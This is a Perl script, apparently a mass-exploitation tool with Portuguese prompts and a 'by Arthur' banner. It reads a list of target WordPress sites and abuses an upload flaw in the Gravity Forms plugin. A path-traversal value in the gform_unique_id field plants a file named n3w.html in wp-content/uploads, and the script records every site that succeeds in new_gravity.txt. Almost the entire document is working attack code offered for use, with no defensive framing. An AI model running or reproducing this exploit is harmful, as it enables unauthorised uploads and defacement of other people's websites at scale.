use utf8;
use Win32::Console::ANSI;
use Term::ANSIColor;
use LWP::UserAgent;

system "cls";
print colored q{
   __________.
  /_/-----/_/|   __    by Arthur
  ( ( ' ' ( (| /'--'\
  (_( ' ' (_(|/.    .\
  / /=====/ /|  '||'	Gravity Forms
 /_//____/_/ |   ||
(o|:.....|o) |   ||
|_|:_____|_|/'  _||_
 '        '    /____\
},'bold';


print "\n\n";
my $path = "?gf_page=upload";
my $up_path = "wp-content/uploads/_input_3_n3w.html";
print colored "[!] INSIRA SUA LISTA: ",'bold';
chomp(my $lista = <STDIN>);
open($lista,'<',$lista) or die "[ X ] ERRO";
my @lista = <$lista>;

foreach $url(@lista){
	print colored "[TARGET] => $url\n",'bold';
	sleep "1";
	
	my $url_path = $uel.$path;
	my $ua = LWP::UserAgent->new();
	my $resp = $ua->post("$url/$path", Cookie => "", Content_Type => "form-data", Content => [file => ["index.jpg"], form_id => "1", field_id => "3", gform_unique_id => "../../../", name => "n3w.html"]);
	
	if($resp->decoded_content =~ /_input_3_n3w.html/){
		print "[";
		print colored "OK",'on_green';
		print "]: $url/wp-content/uploads/_input_3_n3w.html\n\n";
		sleep "1";
		
		open(save,">>new_gravity.txt");
		print save "$url/wp-content/uploads/_input_3_n3w.html\n";
		close(save);
	}
	
	else{
		print "[";
		print colored "FAIL",'on_red';
		print "]\n\n";
	}
}
